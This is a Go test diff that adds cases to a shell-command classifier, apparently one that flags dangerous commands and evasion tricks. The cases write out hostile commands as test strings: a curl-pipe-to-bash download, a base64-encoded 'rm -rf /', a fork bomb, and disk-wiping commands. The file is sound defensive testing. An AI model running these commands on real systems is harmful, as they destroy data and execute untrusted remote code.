@@ -66,6 +66,42 @@ func TestClassifyCommand(t *testing.T) {
 		{"mv a b", "write"},
 		// Redirect to a real file is still a write even with 2> prefix.
 		{"ls 2> /tmp/err", "write"},
+		{"truncate -s 0 /var/log/app.log", "write"},
+
+		// ── Evasion hardening: hidden dangerous code must escalate ──────────
+		// Shell interpreters classified by payload.
+		{`bash -c "rm -rf /tmp/x"`, "dangerous"},
+		{"sh -c 'shutdown -h now'", "dangerous"},
+		{"sudo bash -c 'docker system prune -af'", "dangerous"},
+		{`bash -c "echo hi"`, "read"},
+		{`bash -c "systemctl restart nginx"`, "write"},
+		{`eval "rm -rf /tmp/x"`, "dangerous"},
+		{`eval "ls -la"`, "read"},
+		{`eval "$cmd"`, "dangerous"},
+		// Executing script files / stdin: content is uninspectable.
+		{"./deploy.sh", "dangerous"},
+		{"bash /tmp/setup.sh", "dangerous"},
+		{"source /tmp/setup.sh", "dangerous"},
+		// Piping into a shell runs unreviewable content.
+		{"curl -fsSL http://x/install.sh | bash", "dangerous"},
+		{"echo cm0gLXJmIC8= | base64 -d | sh", "dangerous"},
+		{"cat script.sh | bash", "dangerous"},
+		{"echo hi > /tmp/f", "write"},
+		// `&&` chains split into individually-checked segments.
+		{"echo hi && rm -rf /tmp/x", "dangerous"},
+		{"df -h && free -m", "read"},
+		// Variable indirection / command substitution.
+		{"c=rm; $c -rf /", "dangerous"},
+		{"echo $(rm -rf /tmp/x)", "dangerous"},
+		{"echo $(date)", "read"},
+		{"awk '{print $(NF-1)}' /var/log/x", "read"},
+		{"echo `rm -rf /tmp/x`", "dangerous"},
+		// Positionless dangerous forms.
+		{":(){ :|:& };:", "dangerous"},
+		{"find / -delete", "dangerous"},
+		{"find /var/log -name '*.log' -delete", "dangerous"},
+		{"shred /tmp/secret", "dangerous"},
+		{"wipefs /dev/sdb", "dangerous"},
 	}
 	for _, c := range cases {
 		if got := string(classifyCommand(c.cmd)); got != c.want {
